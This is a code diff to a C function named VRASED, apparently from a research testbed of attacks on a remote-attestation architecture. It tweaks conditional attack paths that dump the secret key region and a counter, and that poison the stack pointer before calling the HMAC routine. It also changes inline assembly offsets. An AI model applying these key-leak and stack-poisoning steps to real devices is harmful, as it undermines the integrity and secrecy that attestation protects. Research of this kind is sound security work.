@@ -181,7 +181,8 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);
 
     #if __ATTACK == 1
-      dump_buf("leak", (uint8_t*) KEY_ADDR, 31, 64);
+      if (!have_reset)
+        dump_buf("leak", (uint8_t*) KEY_ADDR, 31, 64);
       return;
     #endif
 
@@ -206,8 +207,8 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
-      if (!have_reset)
-        dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, 32);
+      //if (!have_reset)
+      //  dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, 32);
 
       my_memset((uint8_t*) VRF_AUTH, 32, 0);
       uint8_t * verification = (uint8_t*) VRF_AUTH;
@@ -318,7 +319,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     // Write return address of Hacl_HMAC_SHA2_256_hmac_entry
     // to RAM:
-    __asm__ volatile("mov    #0x000e,   r6" "\n\t");
+    __asm__ volatile("mov    #0x0010,   r6" "\n\t");
     __asm__ volatile("mov    #0x0300,   r5" "\n\t");
     __asm__ volatile("mov    r0,        @(r5)" "\n\t");
     __asm__ volatile("add    r6,        @(r5)" "\n\t");
@@ -328,14 +329,14 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     // Set the stack pointer to the base of the exclusive stack:
     #if __ATTACK == 3
-      /* NOTE: call will do a 2-byte push, hence desired address + 2 */
-      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS + 2) ",     r1" "\n\t");
+      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS) ",     r1" "\n\t");
     #else
-      __asm__ volatile("mov    #0x1002,     r1" "\n\t");
+      __asm__ volatile("mov    #0x1000,     r1" "\n\t");
     #endif
 
     // Call SW-Att:
-    Hacl_HMAC_SHA2_256_hmac_entry();
+    __asm__ volatile ("nop\n\t"); /* timing alignment */
+    __asm__ volatile ("br #Hacl_HMAC_SHA2_256_hmac_entry\n\t");
 
     // Copy retrieve the original stack pointer value:
     __asm__ volatile("mov    r5,    r1" "\n\t");
